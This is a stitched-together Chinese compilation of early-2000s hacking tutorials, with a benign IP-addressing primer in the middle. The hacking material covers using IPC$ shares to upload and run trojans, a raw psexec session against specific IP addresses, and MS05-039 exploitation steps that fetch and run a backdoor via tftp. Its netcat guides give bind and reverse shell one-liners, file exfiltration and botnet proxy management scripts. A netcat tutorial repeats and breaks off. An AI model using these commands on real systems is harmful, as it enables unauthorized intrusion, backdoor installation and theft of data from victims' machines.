3，根据返回的错误号分析原因： 
错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； 
错误号51，Windows 无法找到网络路径 : 网络有问题； 
错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$； 
错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。 
错误号1326，未知的用户名或错误密码 ： 原因很明显了； 
错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） 
错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。 
4，关于ipc$连不上的问题比较复杂，没有总结出一个统一的认识，我在肉鸡上实验有时会得出矛盾的结论，十分棘手。 而且知道了问题所在，如果没有用其他办法获得shell，很多问题依然不能解决。问题过于细致后就不适合在本文章里探讨了。 各位看着办吧，呵呵。 
5，怎样打开目标的IPC$？ 
答：首先你需要获得一个不依赖于ipc$的shell，比如sql的cmd扩展、telnet、木马。当然，这shell必须是admin权限的。然后你可以使用shell执行命令 net share ipc$ 来开放目标的ipc$。从上一问题可以知道，ipc$能否使用还有很多条件。请确认相关服务都已运行，没有就启动它（不知道怎么做的请看net命令的用法）。还是不行的话（比如有防火墙，杀不了）建议放弃。 
6，怎样映射和访问默认共享？ 
答：使用命令 net use z: \\目标IP\c$ "密码" /user:"用户名" 将对方的c盘映射为自己的z盘，其他盘类推。 
如果已经和目标建立了ipc$，则可以直接用IP加盘符加$访问。比如 copy muma.exe \\IP\d$\path\muma.exe 。或者再映射也可以，只是不用用户名和密码了：net use y: \\IP\d$ 。然后 copy muma.exe y:\path\muma.exe 。当路径中包含空格时，须用""将路径全引住。 
7，如何删除映射和ipc$连接？ 
答：用命令 net use \\IP\ipc$ /del 删除和一个目标的ipc$连接。 
用命令 net use z: /del 删除映射的z盘，其他盘类推。 
用命令 net use * /del 删除全部。会有提示要求按y确认。 
8，连上ipc$然后我能做什么？ 
答：能使用管理员权限的帐号成功和目标连接ipc$，表示你可以和对方系统做深入“交流”了。你可以使用各种命令行方式的工具（比如pstools系列、Win2000SrvReskit、telnethack等）获得目标信息、管理目标的进程和服务等。如果目标开放了默认共享（没开你就帮他开），你就可以上传木马并运行。也可以用tftp、ftp的办法上传。像dwrcc、VNC、RemoteAdmin等工具（木马）还具有直接控屏的功能。如果是2000server，还可以考虑开启终端服务方便控制。这里提到的工具的使用，请看自带的说明或相关教程。 
9，怎样防止别人用ips$和默认共享入侵我？ 
答：A、一种办法是把ipc$和默认共享都删除了。但重起后还会有。这就需要改注册表。 
1，先把已有的删除 
net share ipc$ /del 
net share admin$ /del 
net share c$ /del 
…………（有几个删几个） 
2，禁止别人空连接 
  首先运行regedit，找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]把RestrictAnonymous（DWORD）的键值改为：00000002。 
  3，禁止自动打开默认共享 
  对于server版，找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareServer（DWORD）的键值改为:00000000。 
对于pro版，则是[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareWks（DWORD）的键值改为:00000000。 
如果上面所说的主键不存在，就新建一个再改键值。 
B、另一种是关闭ipc$和默认共享依赖的服务（不推荐） 
net stop lanmanserver 
可能会有提示说，XXX服务也会关闭是否继续。因为还有些次要的服务依赖于lanmanserver。一般情况按y继续就可以了。 
C、最简单的办法是设置复杂密码，防止通过ipc$穷举密码。但如果你有其他漏洞，ipc$将为进一步入侵提供方便。 
D、还有一个办法就是装防火墙，或者端口过滤

【IP地址从头说起】
                          IP地址从头说起 
atty.126.com  2003-4-11  网络休闲庄会员俱乐部


随着电脑技术的逐步普及和因特网技术的迅猛发展，学习因特网、利用因特网已不再是那些腰缠万贯的大款和戴者深度眼睛的专业技术人员的专利，它已作为二十一世纪人类的一种新的生活方式而逐步深入到寻常百姓家。谈到因特网，IP地址就不能不提，因为无论是从学习还是使用因特网的角度来看，IP地址都是一个十分重要的概念，INTERNET的许多服务和特点都是通过IP地址体现出来的。 

一、IP地址的概念　　 
　　我们知道因特网是全世界范围内的计算机联为一体而构成的通信网络的总称。联在某个网络上的两台计算机之间在相互通信时，在它们所传送的数据包里都会含有某些附加信息，这些附加信息就是发送数据的计算机的地址和接受数据的计算机的地址。象这样，人们为了通信的方便给每一台计算机都事先分配一个类似我们日常生活中的电话号码一样的标识地址，该标识地址就是我们今天所要介绍的IP地址。根据TCP/IP协议规定，IP地址是由32位二进制数组成，而且在INTERNET范围内是唯一的。例如，某台联在因特网上的计算机的IP地址为： 

11010010 01001001 10001100 00000010 

很明显，这些数字对于人来说不太好记忆。人们为了方便记忆，就将组成计算机的IP地址的32位二进制分成四段，每段8位，中间用小数点隔开，然后将每八位二进制转换成十进制数，这样上述计算机的IP地址就变成了：210.73.140.2。 

二、IP地址的分类　　 
　　我们说过因特网是把全世界的无数个网络连接起来的一个庞大的网间网，每个网络中的计算机通过其自身的IP地址而被唯一标识的，据此我们也可以设想，在INTERNET上这个庞大的网间网中，每个网络也有自己的标识符。这与我们日常生活中的电话号码很相像，例如有一个电话号码为0515163，这个号码中的前四位表示该电话是属于哪个地区的，后面的数字表示该地区的某个电话号码。与上面的例子类似，我们把计算机的IP地址也分成两部分，分别为网络标识和主机标识。同一个物理网络上的所有主机都用同一个网络标识，网络上的一个主机（包括网络上工作站、服务器和路由器等）都有一个主机标识与其对应?IP地址的4个字节划分为2个部分，一部分用以标明具体的网络段，即网络标识；另一部分用以标明具体的节点，即主机标识，也就是说某个网络中的特定的计算机号码。例如，盐城市信息网络中心的服务器的IP地址为210.73.140.2，对于该IP地址，我们可以把它分成网络标识和主机标识两部分，这样上述的IP地址就可以写成： 

网络标识：210.73.140.0 

主机标识：　　　　 2　　　　　　　　 

合起来写：210.73.140.2 

由于网络中包含的计算机有可能不一样多，有的网络可能含有较多的计算机，也有的网络包含较少的计算机，于是人们按照网络规模的大小，把32位地址信息设成三种定位的划分方式，这三种划分方法分别对应于A类、B类、C类IP地址。 


1．A类IP地址 

　　一个A类IP地址是指，在IP地址的四段号码中，第一段号码为网络号码，剩下的三段号码为本地计算机的号码。如果用二进制表示IP地址的话，A类IP地址就由1字节的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”。A类IP地址中网络的标识长度为7位，主机标识的长度为24位，A类网络地址数量较少，可以用于主机数达1600多万台的大型网络。 


2．B类IP地址 

　　一个B类IP地址是指，在IP地址的四段号码中，前两段号码为网络号码，B类IP地址就由2字节的网络地址和2字节主机地址组成，网络地址的最高位必须是“10”。B类IP地址中网络的标识长度为14位，主机标识的长度为16位，B类网络地址适用于中等规模规模的网络，每个网络所能容纳的计算机数为6万多台。 


3．C类IP地址 

　　一个C类IP地址是指，在IP地址的四段号码中，前三段号码为网络号码，剩下的一段号码为本地计算机的号码。如果用二进制表示IP地址的话，C类IP地址就由３字节的网络地址和1字节主机地址组成，网络地址的最高位必须是“110”。C类IP地址中网络的标识长度为21位，主机标识的长度为8位，C类网络地址数量较多，适用于小规模的局域网络，每个网络最多只能包含254台计算机。 

　　除了上面三种类型的IP地址外，还有几种特殊类型的IP地址，TCP/IP协议规定，凡IP地址中的第一个字节以“lll0”开始的地址都叫多点广播地址。因此，任何第一个字节大于223小于240的IP地址是多点广播地址；IP地址中的每一个字节都为0的地址（“0.0.0.0”）对应于当前主机；IP地址中的每一个字节都为1的IP地址（“255．255．255．255”）是当前子网的广播地址；IP地址中凡是以“llll0”的地址都留着将来作为特殊用途使用；IP地址中不能以十进制“127”作为开头，27．1．1．1用于回路测试，同时网络ID的第一个6位组也不能全置为“0”，全“0”表示本地网络。 

三、IP的寻址规则　　 
　　 1.网络寻址规则 

　　　A、 网络地址必须唯一。 

　　　B、 网络标识不能以数字127开头。在A类地址中，数字127保留给内部回送函数。 

　　　C、 网络标识的第一个字节不能为255。数字2５5作为广播地址。 

　　　D、 网络标识的第一个字节不能为“0”，“0”表示该地址是本地主机，不能传送。 

　　 2.主机寻址规则 

　　　A、主机标识在同一网络内必须是唯一的。 

　　　B、主机标识的各个位不能都为“1”，如果所有位都为“1”，则该机地址是广播地址，而非主机的地址。 

　　　C、主机标识的各个位不能都为“0”，如果各个位都为“0”，则表示“只有这个网络”，而这个网络上没有任何主机。 

四、IP子网掩码概述　　 
　　 

1.子网掩码的概念 

　　子网掩码是一个32位地址，用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在远程网上。 


2.确定子网掩码数 

　　用于子网掩码的位数决定于可能的子网数目和每个子网的主机数目。在定义子网掩码前，必须弄清楚本来使用的子网数和主机数目。 

　　定义子网掩码的步骤为： 

　　A、确定哪些组地址归我们使用。比如我们申请到的网络号为 “210.73.a.b”，该网络地址为c类IP地址，网络标识为“210.73”，主机标识为“a.b”。 

　　B、根据我们现在所需的子网数以及将来可能扩充到的子网数，用宿主机的一些位来定义子网掩码。比如我们现在需要12个子网，将来可能需要16个。用第三个字节的前四位确定子网掩码。前四位都置为“1”，即第三个字节为“11110000”，这个数我们暂且称作新的二进制子网掩码。 

　　C、把对应初始网络的各个位都置为“1”，即前两个字节都置为“1”，第四个字节都置为“0”，则子网掩码的间断二进制形式为：“11111111.11111111.11110000.00000000” 

　　D、把这个数转化为间断十进制形式为：“255.255.240.0” 

这个数为该网络的子网掩码。 


3.IP掩码的标注 

　　A、无子网的标注法 

　　对无子网的IP地址，可写成主机号为0的掩码。如IP地址210.73.140.5，掩码为255.255.255.0，也可以缺省掩码，只写IP地址。 

　　B、有子网的标注法 

　　有子网时，一定要二者配对出现。以C类地址为例。 

　　1.IP地址中的前3个字节表示网络号，后一个字节既表明子网号，又说明主机号，还说明两个IP地址是否属于一个网段。如果属于同一网络区间，这两个地址间的信息交换就不通过路由器。如果不属同一网络区间，也就是子网号不同，两个地址的信息交换就要通过路由器进行。例如：对于IP地址为210.73.140.5的主机来说，其主机标识为00000101，对于IP地址为210.73.140.16的主机来说它的主机标识为00010000，以上两个主机标识的前面三位全是000，说明这两个IP地址在同一个网络区域中，这两台主机在交换信息时不需要通过路由器进行10.73.60.1的主机标识为00000001，210.73.60.252的主机标识为11111100，这两个主机标识的前面三位000与011不同，说明二者在不同的网络区域，要交换信息需要通过路由器。其子网上主机号各为1和252。 

　　2.掩码的功用是说明有子网和有几个子网，但子网数只能表示为一个范围，不能确切讲具体几个子网，掩码不说明具体子网号，有子网的掩码格式(对C类地址): 

五、IP的其他事项　　 
　　1.一般国际互联网信息中心在分配IP地址时是按照网络来分配的，因此只有说到网络地址时才能使用A类、B类、C类的说法； 

　　2.在分配网络地址时，网络标识是固定的，而计算机标识是可以在一定范围内变化的，下面是三类网络地址的组成形式： 

A类地址：73.0.0.0 

B类地址：160.153.0.0 

C类地址：210.73.140.0 

上述中的每个0均可以在0~255之间进行变化。 

　　3.因为IP地址的前三位数字已决定了一个IP地址是属于何种类型的网络，所以A类网络地址将无法再分成B类IP地址，B类IP地址也不能再分成C类IP地址。 

　　4.在谈到某一特定的计算机IP地址时不宜使用A类、B类、C类的说法，但可以说主机地址是属于哪一个A类、B类、C类网络了。 

　　通过上面的学习，大家对IP地址肯定有了了解。有了IP地址大家就可以发送电子邮件了，并且可以获得Internet网上的其他信息，例如可以获得Internet上的WWW服务、BBS服务、FTP服务等等。 




【minglin】
The specified application is not on the path.


G:\1>psexec \\远程机器ip -u abc -p 123 cmd


G:\1>psexec \\远程机器ip -u abc -p 123 -c c:\tftp32.exe -d

G:\1>psexec \\远程机器ip -u abc -p 123 cmd




Make sure that the default admin$ share is enabled on 远程机器ip.

G:\1>psexec \\211.64.201.77 -u administrator cmd

PsExec v1.56 - Execute processes remotely
Copyright (C) 2001-2004 Mark Russinovich
Sysinternals - www.sysinternals.com

Password:

Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-2000 Microsoft Corp.

C:\WINNT\system32>dir /p
 驱动器 C 中的卷没有标签。
 卷的序列号是 1C81-914F

 

G:\1>psexec \\211.64.201.77 -u administrator cmd

PsExec v1.56 - Execute processes remotely
Copyright (C) 2001-2004 Mark Russinovich
Sysinternals - www.sysinternals.com

Password:

Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-2000 Microsoft Corp.

C:\WINNT\system32>sys.bat

C:\WINNT\system32>net share c$ /del
没有提供有效的响应。
用户打开了 c$ 上的文件，继续这项操作会强制关闭文件。

是否继续此操作? (Y/N) [N]:
此共享的资源不存在。


C:\WINNT\system32>请键入 NET HELPMSG 2310 以获得更多的帮助。
net
 share d$ /del  此共享的资源不存在。


d$ 已经删除。
请键入 NET HELPMSG 2310 以获得更多的帮助。



C:\WINNT\system32>net share e$ /del
e$ 已经删除。


C:\WINNT\system32>net share f$ /del
f$ 已经删除。


C:\WINNT\system32>net share g$ /del

C:\WINNT\system32>net share h$ /del

C:\WINNT\system32>sys.bat

C:\WINNT\system32>net share c$ /del
c$ 已经删除。


C:\WINNT\system32>net share d$ /del
此共享的资源不存在。


C:\WINNT\system32>请键入 NET HELPMSG 2310 以获得更多的帮助。
net
 share e$ /del  此共享的资源不存在。



请键入 NET HELPMSG 2310 以获得更多的帮助。
C:\WINNT\system32>
net此共享的资源不存在。
 share f$ /del

请键入 NET HELPMSG 2310 以获得更多的帮助。


C:\WINNT\system32>此共享的资源不存在。
net
 share g$ /del  请键入 NET HELPMSG 2310 以获得更多的帮助。



此共享的资源不存在。
C:\WINNT\system32>
net请键入 NET HELPMSG 2310 以获得更多的帮助。
 share h$ /del


C:\WINNT\system32>sys.bat

C:\WINNT\system32>net share c$ /del
此共享的资源不存在。


C:\WINNT\system32>请键入 NET HELPMSG 2310 以获得更多的帮助。
net
 share d$ /del  此共享的资源不存在。



请键入 NET HELPMSG 2310 以获得更多的帮助。
C:\WINNT\system32>
net此共享的资源不存在。
 share e$ /del

请键入 NET HELPMSG 2310 以获得更多的帮助。


C:\WINNT\system32>此共享的资源不存在。
net share f$ /del

请键入 NET HELPMSG 2310 以获得更多的帮助。


C:\WINNT\system32>此共享的资源不存在。
net
 share g$ /del  请键入 NET HELPMSG 2310 以获得更多的帮助。



此共享的资源不存在。
C:\WINNT\system32>
net请键入 NET HELPMSG 2310 以获得更多的帮助。
 share h$ /del


C:\WINNT\system32>G:
设备未就绪。

C:\WINNT\system32>^C
cmd exited on 211.64.201.77 with error code 0.

G:\1>pslist \\211.64.198.51


G:\1>pslist \\211.64.198.51


G:\1>psexec \\211.64.198.51 -u administrator cmd

PsExec v1.56 - Execute processes remotely
Copyright (C) 2001-2004 Mark Russinovich
Sysinternals - www.sysinternals.com

Password:

Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-2000 Microsoft Corp.

C:\WINNT\system32>^A



http://www.soso123.com/down/list.asp?id=101

【ms05039溢出入侵步骤】
211.64.201.174,"WWWFOX-NET","WWWFOX-NET","Vulnerable"


利用ms05039溢出入侵步骤 

--------------------------------------------------------------------------------
www.hackbase.com 阅读:20612 时间:2005-12-5 0:21:21 来源:黑基博客  
1 用ms05039scan扫描可以入侵的主机
2 use nc to listen local port,command: nc -vv -l -p 1234
3 use溢出tool进行溢出，command: ms05039 目标IP 本地IP 1234
If you are successful,nc窗口将返回一个shell
4 在本地用tftp32.exe建立一个tftp服务器，配置一个木马服务段server.exe
5 在shell中执行command: tftp -i 本地IP get server.exe
6 在shell中运行server.exe

现在，这台机子就是你的肉鸡了

 


【nc】
nc.exe高级技巧应用汇总 
副标题： 
作者：未知 文章来源： 点击数：399 更新时间：2004-12-21 
 
 
文章结构
0. 写在前面的话
1. Netcat 1.10 for NT - nc11nt.zip,原始英文信息
2. Netcat 1.10 for NT 帮助信息
3. Netcat 1.10 常用的命令格式
4. 管理肉鸡,更改肉鸡设置
5. 下载连接
6. 后记 




######################################################################
0. 写在前面的话
######################################################################
最近工作比较空闲，老是想着怎么自动telnet肉鸡，自动执行命令。来管理自己的肉鸡。
自己写一个程序。功底是不够的,所以只有看了看nc的帮助信息,虽然只看了个半懂,
但是借助于金山词霸2002版本, 还是明白了一点东西.
我觉的有必要再总结一下.反正主要是满足我自己的需要.



######################################################################
1. Netcat 1.10 for NT - nc11nt.zip
######################################################################
Basic Features



* Outbound or inbound connections, TCP or UDP, to or from any ports
* Full DNS forward/reverse checking, with appropriate warnings
* Ability to use any local source port
* Ability to use any locally-configured network source address
* Built-in port-scanning capabilities, with randomizer
* Can read command line arguments from standard inputb
* Slow-send mode, one line every N seconds
* Hex dump of transmitted and received data
* Ability to let another program service established
connections
* Telnet-options responder



New for NT



* Ability to run in the background without a console window
* Ability to restart as a single-threaded server to handle a new
connection
________________________________________________________________________
Some of the features of netcat are: 



Outbound or inbound connections, TCP or UDP, to or from any ports 
Full DNS forward/reverse checking, with appropriate warnings 
Ability to use any local source port 
Ability to use any locally-configured network source address 
Built-in port-scanning capabilities, with randomizer 
Built-in loose source-routing capability 
Can read command line arguments from standard input 
Slow-send mode, one line every N seconds 
Optional ability to let another program service inbound connections 



Some of the potential uses of netcat: 



Script backends 
Scanning ports and inventorying services 
Backup handlers 
File transfers 
Server testing and simulation 
Firewall testing 
Proxy gatewaying 
Network performance testing 
Address spoofing tests 
Protecting X servers 
1001 other uses you`ll likely come up with 



Netcat + Encryption = Cryptcat



对比win2000微软的telnet.exe和微软的tlntsvr.exe服务,连接的时候就可以看出来了.
1.1 NC.EXE是一个非标准的telnet客户端程序,
1.2 还有一个putty.exe客户端程序,提供四种连接模式
-raw -telnet -rlogin -ssh.



######################################################################
2. Netcat 1.10 for NT 帮助信息
######################################################################
C:\WINDOWS\Desktop>nc -h
[v1.10 NT]
connect to somewhere: nc [-options] hostname port[s] [ports] ...
listen for inbound: nc -l -p port [options] [hostname] [port]
options:
-d detach from console, background mode (后台模式)
-e prog inbound program to exec [dangerous!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h this cruft (本帮助信息)
-i secs delay interval for lines sent, ports scanned (延迟时间)
-l listen mode, for inbound connects (监听模式,等待连接)
-L listen harder, re-listen on socket close (连接关闭后,仍然继续监听)
-n numeric-only IP addresses, no DNS (ip数字模式,非dns解析)
-o file hex dump of traffic (十六进制模式输出文件,三段) 
-p port local port number (本地端口)
-r randomize local and remote ports (随机本地远程端口)
-s addr local source address (本地源地址)
-t answer TELNET negotiation
-u UDP mode
-v verbose [use twice to be more verbose] (-vv 更多信息)
-w secs timeout for connects and final net reads
-z zero-I/O mode [used for scanning] (扫描模式,-vv)
port numbers can be individual or ranges: m-n [inclusive]



######################################################################
3. Netcat 1.10 常用的命令格式
######################################################################
下面引用 《沉睡不醒 10月15日凌晨》的文章的部分。



3.1.端口的刺探：
nc -vv ip port
RIVER [192.168.0.198] 19190 (?) open //显示是否开放open
3.2.扫描器
nc -vv -w 5 ip port-port port
nc -vv -z ip port-port port
这样扫描会留下大量的痕迹，系统管理员会额外小心



3.3. 后门
victim machine: //受害者的机器
nc -l -p port -e cmd.exe //win2000
nc -l -p port -e /bin/sh //unix,linux
attacker machine: //攻击者的机器.
nc ip -p port //连接victim_IP,然后得到一个shell。




3.4.反向连接
attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击.
//或者wollf的反向连接.
nc -vv -l -p port 
victim machine:
nc -e cmd.exe attacker ip -p port
nc -e /bin/sh attacker ip -p port



或者：
attacker machine:
nc -vv -l -p port1 /*用于输入*/
nc -vv -l -p prot2 /*用于显示*/
victim machine:
nc attacker_ip port1 | cmd.exe | nc attacker_ip port2
nc attacker_ip port1 | /bin/sh | nc attacker_ip port2



139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP）
这样就可以保证nc.exe优先于NETBIOS。 




3.5.传送文件：
3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来.
nc -d -l -p port < path\filedest 　　　 /*attacker machine*/ 可以shell执行
nc -vv attacker_ip port > path\file.txt /*victim machine*/ 需要Ctrl+C退出
//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.



3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡
nc －vv -l -p port > path\file.txt　　　　　 /*victim machine*/ 需要Ctrl+C退出
nc -d victim_ip port < path\filedest 　 /*attacker machine*/ 可以shell执行
//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.



结论: 可以传输ascii,bin文件.可以传输程序文件.



问题:连接某个ip后,传送完成后,需要发送Ctrl+C退出nc.exe .
或者只有再次连接使用pskill.exe 杀掉进程.但是是否释放传输文件打开的句柄了?




3.6 端口数据抓包.
nc -vv -w 2 -o test.txt www.xfocus.net 80 21-15



< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error
< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr
< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized...
< 00000084 83 00 00 01 8f # .....




3.7 telnet,自动批处理。 ★★★★★我要重点推荐的东西就是这个.
nc victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程.
nc -vv victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程.



nc -d victim_ip port < path\file.cmd 安静模式.



_______________file.cmd________________________
password
cd %windir%
echo []=[%windir%]
c:
cd \
md test
cd /d %windir%\system32\
net stop sksockserver
snake.exe -config port 11111
net start sksockserver
exit
_______________file.cmd__END___________________



######################################################################
4. 管理肉鸡,更改肉鸡设置
######################################################################
4.1 比如要统一更改肉鸡上面的代理端口.snake.exe 修改为11111 服务名称"sksockserver"
使用winshell后门. 端口1234 密码password
命令格式就是
modi.bat youip.txt



___________modi.bat____________________________
@if "%1"=="" echo Error: no ip.txt &&goto END



:start
@echo password >a.cmd
@echo s >>a.cmd
@echo cd /d %%windir%%\system32\ >>a.cmd
@net stop "sksockserver" >>a.cmd
@snake.exe -config port 11111 >>a.cmd
@net start "sksockserver" >>a.cmd
@exit >>a.cmd



:auto
@for /f "eol=; tokens=1,2" %%i in (%1) do @(nc.exe -vv -w 3 %%i 1234 < a.cmd)



:END
___________modi.bat__END_______________________




4.2



@echo off
color f0
:start
cls
C:\nc -vv -w 3 -l -p 80>>80.txt
goto start
把防火墙关掉以后运行这个批处理，会监听到许多探测U漏洞的信息，大多
是三条一组--妮姆达病毒扫描你的。这样就会得到肉鸡的.虽然质量不高.
但是也是一种便宜的办法.



肉鸡特征：
1。unicode漏洞
2。guest密码为空，administrators组用户
3。其他漏洞



自己慢慢的爽去吧。不过，再次强调一句，不建议而且是不能破坏国内主机，上去以后将tftp.exe改名。然后用pskill干掉mmc.exe进程，之后是杀毒。做好后门以后，将guest帐号停用，以对付傻瓜扫描器



######################################################################
5. 下载连接
######################################################################
5.1http://www.atstake.com/research/tools/network_utilities/
Tool: Netcat 1.10 for Unix 
Version: 03.20.96 
Platforms: *nix



Tool: Netcat 1.1 for Win 95/98/NT/2000 
Version: 02.08.98 
Platforms: Runs on Win 95/98/NT/2000 




5.2http://www.xfocus.net/download.php?id=320 
名称： cryptcat_nt.zip 更新时间： 2002-04-05 
类别： 网络工具 平台： Win9x/NT/2000 大小： 115.8K 提交： maxilaw 
简介： 加密传输的nc。 



5.3http://content.443.ch/pub/security/blackhat/Networking/nc/ 国外的网站
10.03.02 15:48 1305 cryptcat.txt
10.03.02 15:48 245760 cryptcat_linux2.tar
10.03.02 15:48 118533 cryptcat_nt.zip




######################################################################
6. 后记
######################################################################



只有明天上网,找个win2000 server登陆终端服务来测试了。
我的还是破win98,没有办法哟. 


【nc妙用，反向连接穿越防火墙】
nc妙用，反向连接穿越防火强


提交者邮件地址: sy999888@163.com
提交者QQ号码: 13865333
标题: nc妙用，反向连接穿越防火强 (作者：greenice www.ls3389.com )
内容:
nc妙用，反向连接穿越防火强 (作者：greenice www.ls3389.com )
被称为瑞士军刀的NC其实有很多妙用，网上有很多使用说明，但都讲得很浅。
现在讲其中的一个妙用：
很多防火强都限定了端口，不给正向连接。但是由里向外反向连接是可以的!!
先在本机用
nc -l -p 54
开一个端口!
进入目标主机后(怎么进那是你的问题了，比如U)在目标主机中用
nc 你的本机IP 54 >> nc -e cmd.exe
这时nc就会反向发一个shell给你，防火强就会为你转发数据

【NC教程】
文章结构
0. 写在前面的话
1. Netcat 1.10 for NT - nc11nt.zip,原始英文信息
2. Netcat 1.10 for NT 帮助信息
3. Netcat 1.10 常用的命令格式
4. 管理肉鸡,更改肉鸡设置
5. 下载连接
6. 后记

######################################################################
0. 写在前面的话
######################################################################
最近工作比较空闲，老是想着怎么自动telnet肉鸡，自动执行命令。来管理自己的肉鸡。
自己写一个程序。功底是不够的,所以只有看了看nc的帮助信息,虽然只看了个半懂,
但是借助于金山词霸2002版本, 还是明白了一点东西.
我觉的有必要再总结一下.反正主要是满足我自己的需要.

######################################################################
1. Netcat 1.10 for NT - nc11nt.zip
######################################################################
Basic Features

* Outbound or inbound connections, TCP or UDP, to or from any ports
* Full DNS forward/reverse checking, with appropriate warnings
* Ability to use any local source port
* Ability to use any locally-configured network source address
* Built-in port-scanning capabilities, with randomizer
* Can read command line arguments from standard inputb
* Slow-send mode, one line every N seconds
* Hex dump of transmitted and received data
* Ability to let another program service established
connections
* Telnet-options responder

New for NT

* Ability to run in the background without a console window
* Ability to restart as a single-threaded server to handle a new
connection
________________________________________________________________________
Some of the features of netcat are: 

Outbound or inbound connections, TCP or UDP, to or from any ports 
Full DNS forward/reverse checking, with appropriate warnings 
Ability to use any local source port 
Ability to use any locally-configured network source address 
Built-in port-scanning capabilities, with randomizer 
Built-in loose source-routing capability 
Can read command line arguments from standard input 
Slow-send mode, one line every N seconds 
Optional ability to let another program service inbound connections 

Some of the potential uses of netcat: 

Script backends 
Scanning ports and inventorying services 
Backup handlers 
File transfers 
Server testing and simulation 
Firewall testing 
Proxy gatewaying 
Network performance testing 
Address spoofing tests 
Protecting X servers 
1001 other uses you`ll likely come up with 

Netcat + Encryption = Cryptcat

对比win2000微软的telnet.exe和微软的tlntsvr.exe服务,连接的时候就可以看出来了.
1.1 NC.EXE是一个非标准的telnet客户端程序,
1.2 还有一个putty.exe客户端程序,提供四种连接模式
-raw -telnet -rlogin -ssh.

######################################################################
2. Netcat 1.10 for NT 帮助信息
######################################################################
C:\WINDOWS\Desktop>nc -h
[v1.10 NT]
connect to somewhere: nc [-options] hostname port[s] [ports] ...
listen for inbound: nc -l -p port [options] [hostname] [port]
options:
-d detach from console, background mode (后台模式)
-e prog inbound program to exec [dangerous!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h this cruft (本帮助信息)
-i secs delay interval for lines sent, ports scanned (延迟时间)
-l listen mode, for inbound connects (监听模式,等待连接)
-L listen harder, re-listen on socket close (连接关闭后,仍然继续监听)
-n numeric-only IP addresses, no DNS (ip数字模式,非dns解析)
-o file hex dump of traffic (十六进制模式输出文件,三段) 
-p port local port number (本地端口)
-r randomize local and remote ports (随机本地远程端口)
-s addr local source address (本地源地址)
-t answer TELNET negotiation
-u UDP mode
-v verbose [use twice to be more verbose] (-vv 更多信息)
-w secs timeout for connects and final net reads
-z zero-I/O mode [used for scanning] (扫描模式,-vv)
port numbers can be individual or ranges: m-n [inclusive]

######################################################################
3. Netcat 1.10 常用的命令格式
######################################################################
下面引用 《沉睡不醒 10月15日凌晨》的文章的部分。

3.1.端口的刺探：
nc -vv ip port
RIVER [192.168.0.198] 19190 (?) open //显示是否开放open
3.2.扫描器
nc -vv -w 5 ip port-port port
nc -vv -z ip port-port port
这样扫描会留下大量的痕迹，系统管理员会额外小心

3.3. 后门
victim machine: //受害者的机器
nc -l -p port -e cmd.exe //win2000
nc -l -p port -e /bin/sh //unix,linux
attacker machine: //攻击者的机器.
nc ip -p port //连接victim_IP,然后得到一个shell。


3.4.反向连接
attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击.
//或者wollf的反向连接.
nc -vv -l -p port 
victim machine:
nc -e cmd.exe attacker ip -p port
nc -e /bin/sh attacker ip -p port

或者：
attacker machine:
nc -vv -l -p port1 /*用于输入*/
nc -vv -l -p prot2 /*用于显示*/
victim machine:
nc attacker_ip port1 | cmd.exe | nc attacker_ip port2
nc attacker_ip port1 | /bin/sh | nc attacker_ip port2

139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP）
这样就可以保证nc.exe优先于NETBIOS。 


3.5.传送文件：
3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来.
nc -d -l -p port < path\filedest 　　　 /*attacker machine*/ 可以shell执行
nc -vv attacker_ip port > path\file.txt /*victim machine*/ 需要Ctrl+C退出
//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.

3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡
nc －vv -l -p port > path\file.txt　　　　　 /*victim machine*/ 需要Ctrl+C退出
nc -d victim_ip port < path\filedest 　 /*attacker machine*/ 可以shell执行
//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.

结论: 可以传输ascii,bin文件.可以传输程序文件.

问题:连接某个ip后,传送完成后,需要发送Ctrl+C退出nc.exe .
或者只有再次连接使用pskill.exe 杀掉进程.但是是否释放传输文件打开的句柄了?


3.6 端口数据抓包.
nc -vv -w 2 -o test.txt www.xfocus.net 80 21-15

< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error
